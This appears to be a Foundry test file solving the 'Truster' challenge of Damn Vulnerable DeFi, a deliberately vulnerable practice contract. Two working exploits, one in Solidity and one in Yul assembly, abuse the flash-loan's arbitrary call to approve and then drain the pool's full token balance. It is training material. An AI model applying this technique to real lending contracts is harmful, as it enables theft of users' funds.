pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../contracts/TrusterLenderPool.sol";

contract TrusterTest is Test {
    address payable public player;

    DamnValuableToken token;
    TrusterLenderPool pool;

    uint256 constant TOKENS_IN_POOL = 1_000_000 ether;

    function setUp() public {
        // Create users
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);

        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);

        assertEq(address(pool.token()), address(token));

        token.transfer(address(pool), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    function test_solve() public {
        vm.startPrank(player);
        bytes memory approveCalldata = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );
        console.logBytes(approveCalldata);

        bytes memory flashloanCalldata = abi.encodeWithSignature(
            "flashLoan(uint256,address,address,bytes)",
            0,
            player,
            address(token),
            approveCalldata
        );
        console.logBytes(flashloanCalldata);
        (bool success, bytes memory data) = address(pool).call(
            flashloanCalldata
        );

        token.transferFrom(address(pool), player, TOKENS_IN_POOL);
        vm.stopPrank();

        // final checks
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }

    function test_solveYul() public {
        vm.startPrank(player);

        bytes memory approveCalldata;
        bytes memory flashloanCalldata;
        assembly {
            let fmp := mload(0x40)
            mstore(fmp, 68)
            mstore(0, "approve(address,uint256)")
            mstore(add(fmp, 32), keccak256(0, 24))
            mstore(add(fmp, 36), sload(player.slot))
            mstore(add(fmp, 68), TOKENS_IN_POOL)
            approveCalldata := fmp
            mstore(0x40, add(fmp, 100))

            mstore(0, "flashLoan(uint256,address,addres")
            mstore(32, "s,bytes)")
            fmp := mload(0x40)
            mstore(fmp, 0x104)
            mstore(add(fmp, 0x20), keccak256(0, 40))
            mstore(add(fmp, 0x24), 0)
            mstore(add(fmp, 0x44), sload(player.slot))
            mstore(add(fmp, 0x64), sload(token.slot))
            mstore(add(fmp, 0x84), 0x80)
            pop(
                staticcall(
                    gas(),
                    0x4,
                    approveCalldata,
                    100,
                    add(fmp, 0xa4),
                    100
                )
            )
            flashloanCalldata := fmp
            mstore(0x40, add(fmp, 0x128))

            let success := call(
                gas(),
                sload(pool.slot),
                0,
                add(flashloanCalldata, 0x20),
                0x104,
                0,
                0
            )
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "transferFrom(address,address,uin")
            mstore(32, "t256)")
            fmp := mload(0x40)
            mstore(fmp, keccak256(0, 37))
            mstore(add(fmp, 4), sload(pool.slot))
            mstore(add(fmp, 0x24), sload(player.slot))
            mstore(add(fmp, 0x44), TOKENS_IN_POOL)
            success := call(gas(), sload(token.slot), 0, fmp, 0x64, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
        console.logBytes(approveCalldata);
        console.logBytes(flashloanCalldata);

        vm.stopPrank();

        // final checks
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
